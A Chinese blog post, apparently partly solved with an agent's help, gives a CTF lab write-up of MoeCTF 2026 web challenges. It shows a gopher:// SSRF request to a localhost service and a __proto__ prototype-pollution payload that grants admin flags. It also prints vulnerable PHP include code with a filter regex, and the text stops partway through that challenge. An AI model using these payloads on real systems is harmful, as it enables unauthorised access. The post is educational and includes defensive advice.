@@ -1,0 +1,513 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>MoeCTF 2026 Web 安全与渗透测试 Writeup（下） | iss-xx</title><meta name="author" content="iss"><meta name="copyright" content="iss"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="MoeCTF 2026 西电新生赛 Web 方向题解合集（下篇）">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MoeCTF 2026 Web 安全与渗透测试 Writeup（下）">
+<meta property="og:url" content="http://iss-xx.xin/2026/09/13/MoeCTF%202026%20Web%20%E5%AE%89%E5%85%A8%E4%B8%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%20Writeup%EF%BC%88%E4%B8%8B%EF%BC%89/index.html">
+<meta property="og:site_name" content="iss-xx">
+<meta property="og:description" content="MoeCTF 2026 西电新生赛 Web 方向题解合集（下篇）">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://iss-xx.xin/img/x6.jpg">
+<meta property="article:published_time" content="2026-09-13T12:30:00.000Z">
+<meta property="article:modified_time" content="2026-09-16T14:44:12.961Z">
+<meta property="article:author" content="iss">
+<meta property="article:tag" content="Cookie">
+<meta property="article:tag" content="HTTP请求走私">
+<meta property="article:tag" content="JWT">
+<meta property="article:tag" content="LFI">
+<meta property="article:tag" content="MoeCTF">
+<meta property="article:tag" content="SQL盲注">
+<meta property="article:tag" content="SSRF">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="Writeup">
+<meta property="article:tag" content="原型链污染">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://iss-xx.xin/img/x6.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "MoeCTF 2026 Web 安全与渗透测试 Writeup（下）",
+  "url": "http://iss-xx.xin/2026/09/13/MoeCTF%202026%20Web%20%E5%AE%89%E5%85%A8%E4%B8%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%20Writeup%EF%BC%88%E4%B8%8B%EF%BC%89/",
+  "image": "http://iss-xx.xin/img/x6.jpg",
+  "datePublished": "2026-09-13T12:30:00.000Z",
+  "dateModified": "2026-09-16T14:44:12.961Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "iss",
+      "url": "http://iss-xx.xin"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/%E5%A4%B4%E5%83%8F.jpg"><link rel="canonical" href="http://iss-xx.xin/2026/09/13/MoeCTF%202026%20Web%20%E5%AE%89%E5%85%A8%E4%B8%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%20Writeup%EF%BC%88%E4%B8%8B%EF%BC%89/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.3.1/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        const data = { value }
+
+        if (ttl != null) {
+          data.expiry = Date.now() + ttl * 86400000
+        }
+
+        localStorage.setItem(key, JSON.stringify(data))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return
+
+        try {
+          const data = JSON.parse(itemStr)
+
+          if (data.expiry && Date.now() > data.expiry) {
+            localStorage.removeItem(key)
+            return
+          }
+
+          return data.value
+        } catch {
+          localStorage.removeItem(key)
+        }
+      }
+    }
+
+    const scriptCache = new Map()
+    const cssCache = new Map()
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => {
+        if (scriptCache.has(url)) {
+          return scriptCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const script = document.createElement('script')
+
+          script.src = url
+          script.async = true
+
+          for (const key in attr) {
+            script.setAttribute(key, attr[key])
+          }
+
+          script.onload = resolve
+          script.onerror = reject
+
+          document.head.appendChild(script)
+        })
+
+        scriptCache.set(url, promise)
+
+        return promise
+      },
+      getCSS: (url, id) => {
+        if (cssCache.has(url)) {
+          return cssCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const link = document.createElement('link')
+
+          link.rel = 'stylesheet'
+          link.href = url
+
+          if (id) {
+            link.id = id
+          }
+
+          link.onload = resolve
+          link.onerror = reject
+
+          document.head.appendChild(link)
+        })
+
+        cssCache.set(url, promise)
+
+        return promise
+      },
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const metaThemeColor = document.querySelector('meta[name="theme-color"]')
+      const activateDarkMode = () => {
+        document.documentElement.dataset.theme = 'dark'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.dataset.theme = 'light'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', 'ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'MoeCTF 2026 Web 安全与渗透测试 Writeup（下）',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><style> /* 让背景图片变半透明 */ #web_bg { opacity: 0.2;  /* 0.0 ~ 1.0，数值越小越透明 */ } </style><meta name="generator" content="Hexo 8.1.2"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      if ($loadingBox.classList.contains('loaded')) return
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+
+  if (document.readyState === 'complete') {
+    preloader.endLoading()
+  } else {
+    window.addEventListener('load', preloader.endLoading)
+    document.addEventListener('DOMContentLoaded', preloader.endLoading)
+    // Add timeout protection: force end after 7 seconds
+    setTimeout(preloader.endLoading, 7000)
+  }
+
+  if (false) {
+    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
+    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
+  }
+})()</script><div class="bg-animation" id="web_bg" style="background-image: url(/img/beijin.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/%E5%A4%B4%E5%83%8F.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">26</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-tags"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-folder-open"></i><span> 标签</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/5.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/%E5%A4%B4%E5%83%8F.jpg" alt="Logo"><span class="site-name">iss-xx</span></a><a class="nav-page-title" href="/"><span class="site-name">MoeCTF 2026 Web 安全与渗透测试 Writeup（下）</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-tags"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-folder-open"></i><span> 标签</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">MoeCTF 2026 Web 安全与渗透测试 Writeup（下）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2026-09-13T12:30:00.000Z" title="Created 2026-09-13 20:30:00">2026-09-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-09-16T14:44:12.961Z" title="Updated 2026-09-16 22:44:12">2026-09-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><!-- 图片说明：本合集各题截图（如 sys2_page.png / gu_shu_1_home.png / wafm_1_home.png 等）为本地文件，发布前请上传图床并替换正文中的 ![](xxx) 链接 -->
+
+<h1 id="MoeCTF-2026-Web-安全与渗透测试-Writeup（下篇）"><a href="#MoeCTF-2026-Web-安全与渗透测试-Writeup（下篇）" class="headerlink" title="MoeCTF 2026 Web 安全与渗透测试 Writeup（下篇）"></a>MoeCTF 2026 Web 安全与渗透测试 Writeup（下篇）</h1><blockquote>
+<p>西电 CTF 终端 · MoeCTF 2026 新生赛 · Web 安全与渗透测试方向 · 下篇（共 6 题）<br> (使用agent协助做题)</p>
+</blockquote>
+<hr>
+<h2 id="1-熊出没（100-分）"><a href="#1-熊出没（100-分）" class="headerlink" title="1. 熊出没（100 分）"></a>1. 熊出没（100 分）</h2><blockquote>
+<p>MoeCTF 2026 · Web 安全与渗透测试 · 100 分<br>题目：熊出没（两只小熊在狗粉岭找蜂蜜，发现许多蜜罐，但有些是猎人设的陷阱。蜂蜜在 54321 端口）</p>
+</blockquote>
+<p>打开题目是一个「狗粉岭」网页，中间一个表单让你输入「蜜罐地址」，提交后服务器帮你去「看看是不是真的蜂蜜」。</p>
+<p><img src="/img/xcm_1_home.png" alt="题目首页"></p>
+<p>表单 <code>POST /fetch</code>，参数 <code>url</code>——服务器按你给的 URL 去抓内容，这明显是一个 <strong>SSRF（服务端请求伪造）</strong> 端点。SSRF 指攻击者让<strong>服务器</strong>代替自己去发起网络请求，从而访问攻击者本来访问不到的目标：普通用户只能从「外部」访问网站，但服务器往往在内网，能访问内网里不对外暴露的服务（数据库、缓存、内部 API）。如果网站有个「按用户给的 URL 去抓内容」的功能，就能传一个内网地址让它帮忙访问，再通过回显把结果带出来。</p>
+<p>顺着提示「蜂蜜在 54321 端口」，先试 <code>http://127.0.0.1:54321/</code>，结果返回的是一堆随机出现的「陷阱」提示（🐝 愤怒的蜂群、🍯 陷阱蜜、🪤 假蜜罐、🐻 捕兽夹）。这正是**蜜罐（Honeypot）**的思路：故意布置看起来像真目标、实则用来迷惑攻击者的假服务或假数据。这里的随机陷阱文案说明服务器并没有真正用 HTTP 抓到 54321 的内容，而是把我们挡在了外面。</p>
+<p>关键线索藏在报错里。提交一个不完整的 URL 时，<code>/fetch</code> 返回：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL不合法！请输入完整的 URL 地址（需包含协议和主机，例如 gopher://host:port/...）</span><br></pre></td></tr></table></figure>
+
+<p>它明示了 <code>gopher://</code> 协议——也就是说 54321 端口上的「蜂蜜保险库」是一个<strong>原始 TCP 服务</strong>，不是 HTTP 服务，用 <code>http://</code> 连自然连不上、只能看到陷阱。这里涉及 SSRF 里一个经典武器：<strong>gopher 协议</strong>能向任意主机、任意端口发送任意构造的字节流，并且把后续内容作为「要发送的数据」。<code>http://</code> 只能发 HTTP 格式的请求，遇到非 HTTP 的 TCP 服务（Redis、MySQL、或本题的自定义协议）就无能为力；<code>gopher://host:port/_payload</code> 则能把 <code>_payload</code> 之后的内容当作原始字节直接发过去。</p>
+<p>先用 gopher 连一下根路径探底：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /fetch</span><br><span class="line">url=gopher://127.0.0.1:54321/</span><br></pre></td></tr></table></figure>
+
+<p>返回：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Honey Vault</span><br><span class="line">paths: /secret-honey</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/xcm_2_gopher.png" alt="gopher 探出路径"></p>
+<p>它告诉我们 flag 藏在 <code>/secret-honey</code> 上。带路径再请求（注意 gopher 的 selector 要保留开头的斜杠，URL 里写成两个斜杠 <code>//secret-honey</code>）：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /fetch</span><br><span class="line">url=gopher://127.0.0.1:54321//secret-honey</span><br></pre></td></tr></table></figure>
+
+<p>返回：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;9bbf74d3-9582-c6fd-efa8-1fe7dee46273&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/xcm_3_flag.png" alt="拿到 flag"></p>
+<p>（本题需要先启动在线环境，再经平台 WSRX 隧道转发到容器。）</p>
+<p><strong>Flag:</strong> <code>moectf{9bbf74d3-9582-c6fd-efa8-1fe7dee46273}</code></p>
+<p>补充一点背景：SSRF 的常见目标还包括探测内网开放端口、读内网服务、访问云厂商元数据接口（<code>http://169.254.169.254/</code> 泄露凭证）等。防护核心是对用户提供的目标地址做严格校验（协议、域名、IP 段）并限制服务器能访问的范围。</p>
+<hr>
+<h2 id="2-合乎周礼（150-分）"><a href="#2-合乎周礼（150-分）" class="headerlink" title="2. 合乎周礼（150 分）"></a>2. 合乎周礼（150 分）</h2><blockquote>
+<p>MoeCTF 2026 · Web 安全与渗透测试 · 150 分<br>题目：合乎周礼（父亲管教儿子讲的是长幼有序、本分分明；JavaScript 里的父类也要让子类守好本分、不逾矩）</p>
+</blockquote>
+<p>打开题目是一个 Node.js「配置中心」，首页直接列出所有接口：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET  /api/help      查看接口说明</span><br><span class="line">GET  /api/me        查看当前配置</span><br><span class="line">POST /api/profile   提交 JSON 配置</span><br><span class="line">GET  /api/flag      读取审核后的结果</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/hl_1_home.png" alt="题目首页"></p>
+<p><code>GET /api/help</code> 给出关键信息——<code>/api/flag</code> 只有在 <code>isAdmin=true</code> 且 <code>canReadFlag=true</code> 时才返回 FLAG：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;配置中心&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;routes&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;GET /api/flag&quot;</span><span class="punctuation">:</span> <span class="string">&quot;只有审核 isAdmin=true 且 canReadFlag=true 时返回 FLAG&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>先看 <code>GET /api/me</code>，返回当前配置和一个 <code>inheritedProbe</code> 字段：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;profile&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;profile&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="attr">&quot;nickname&quot;</span><span class="punctuation">:</span> <span class="string">&quot;guest&quot;</span> <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;theme&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;blue&quot;</span> <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;inheritedProbe&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="attr">&quot;isAdmin&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> <span class="attr">&quot;canReadFlag&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span> <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/hl_2_me.png" alt="当前配置，inheritedProbe 均为 null"></p>
+<p>注意 <code>inheritedProbe</code> 里 <code>isAdmin</code>、<code>canReadFlag</code> 都是 <strong>null</strong>，而 <code>/api/flag</code> 报错里反复出现「<strong>继承属性</strong>」四个字：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;ok&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;message&quot;</span><span class="punctuation">:</span> <span class="string">&quot;审核未通过：普通访客缺少 isAdmin=true 和 canReadFlag=true 的继承属性。&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;inheritedProbe&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="attr">&quot;isAdmin&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> <span class="attr">&quot;canReadFlag&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span> <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>这就要理解 JavaScript 的对象模型了。JS 的继承机制和 Java&#x2F;C++ 不一样，是<strong>基于原型（prototype）<strong>的：每个对象都有一个内部指针指向它的「原型对象」，访问对象属性时，如果自身没有，就顺着这条</strong>原型链</strong>一路向上查找，直到找到或到达 <code>null</code>。所有普通对象最终都指向同一个原型 <code>Object.prototype</code>——这意味着<strong>往 <code>Object.prototype</code> 上添加一个属性，等于给所有对象都「继承」了这个属性</strong>。<code>config.isAdmin</code> 之所以是 null，就是 <code>config</code> 自身没有，顺着原型链从 <code>Object.prototype</code> 查到的（默认没有）。</p>
+<p>于是思路清晰了：服务器读 <code>config.isAdmin</code> 和 <code>config.canReadFlag</code>，这俩属性不在配置对象自身身上、是从原型继承来的；只要往 <code>Object.prototype</code> 上注入 <code>isAdmin=true</code> 和 <code>canReadFlag=true</code>，审核自然通过。这就是<strong>原型链污染（Prototype Pollution）</strong>：程序允许攻击者控制「给对象添加属性」的键名且不做过滤时，把键名设为 <code>__proto__</code>，就能把属性写到 <code>Object.prototype</code> 上、污染全局原型。</p>
+<p><code>POST /api/profile</code> 会把提交的 JSON <strong>递归合并（Deep Merge）</strong> 进配置对象——即逐层合并，目标对象里没有的键就复制进去、值是对象则继续递归。它的危险性在于：如果合并时用 <code>target[key] = source[key]</code> 这种直接赋值，当 <code>key</code> 恰好是 <code>__proto__</code> 时，<code>target.__proto__</code> 会被当成普通属性赋值，结果污染原型。其中 <code>__proto__</code> 是非标准但被广泛支持的原型访问器，指向对象的原型（对普通对象就是 <code>Object.prototype</code>），是污染攻击最常用的键名。</p>
+<p>于是直接提交污染载荷：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /api/profile</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;isAdmin&quot;:true,&quot;canReadFlag&quot;:true&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>返回里 <code>inheritedProbe</code> 已经变成 <code>true</code>：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;ok&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;acceptedFields&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;inheritedProbe&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="attr">&quot;isAdmin&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> <span class="attr">&quot;canReadFlag&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span> <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>再访问 <code>GET /api/flag</code>，直接拿到 flag：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span> <span class="attr">&quot;ok&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> <span class="attr">&quot;flag&quot;</span><span class="punctuation">:</span> <span class="string">&quot;moectf&#123;0n3_pr070type_chan9e_@|l_06j3c7$_o8ey&#125;&quot;</span> <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/hl_3_flag.png" alt="原型污染后拿到 flag"></p>
+<p><strong>Flag:</strong> <code>moectf{0n3_pr070type_chan9e_@|l_06j3c7$_o8ey}</code></p>
+<p>原型链污染是 Node.js &#x2F; 前端 JS 应用里一类经典且危害极大的漏洞（任意属性注入、权限提升，配合特定库甚至能 RCE）。防护思路：合并时拒绝 <code>__proto__</code>、<code>constructor</code>、<code>prototype</code> 这些危险键，或用 <code>Object.create(null)</code> 创建无原型对象、用 <code>Map</code> 存键值。</p>
+<hr>
+<h2 id="3-七狗免费小说（150-分）"><a href="#3-七狗免费小说（150-分）" class="headerlink" title="3. 七狗免费小说（150 分）"></a>3. 七狗免费小说（150 分）</h2><blockquote>
+<p>MoeCTF 2026 · Web 安全与渗透测试 · 150 分<br>题目：七狗免费小说（「php:&#x2F;&#x2F; 是什么？小刻不知道哦。CTFer 都会先打开 F12 看看，万一里面有宝物呢？」）</p>
+</blockquote>
+<p>打开题目是一个小说网站「刻俄柏的小说」，页面上有三个章节链接：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=chap1.html   第一章</span><br><span class="line">?file=chap2.html   第二章</span><br><span class="line">?file=flag.php     Flag 章</span><br></pre></td></tr></table></figure>
+
+<p><code>?file=</code> 参数直接拼进文件路径，典型 PHP 文件包含。按提示先「F12 看看」——页面底部有个 <code>display:none</code> 的隐藏 div，里面用 <code>highlight_file(__FILE__)</code> 把 index.php 的完整源码打了出来。</p>
+<p><img src="/img/qg_1_home.png" alt="题目首页"></p>
+<p>关键源码（就是隐藏 div 打印出来的）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] ?? <span class="string">&#x27;chap1.html&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|env|\.\.|^\/|=\/|index|proc|input|data|convert|string|file/i&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;咬你哦！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$output</span> = <span class="title function_ invoke__">ob_get_clean</span>();</span><br><span class="line">    <span class="keyword">if</span> (@<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;//u&#x27;</span>, <span class="variable">$output</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$output</span>;              <span class="comment">// 合法 UTF-8 → 直接输出</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$output</span>); <span class="comment">// 二进制流 → 自动 base64</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/qg_2_source.png" alt="隐藏的 index.php 源码"></p>
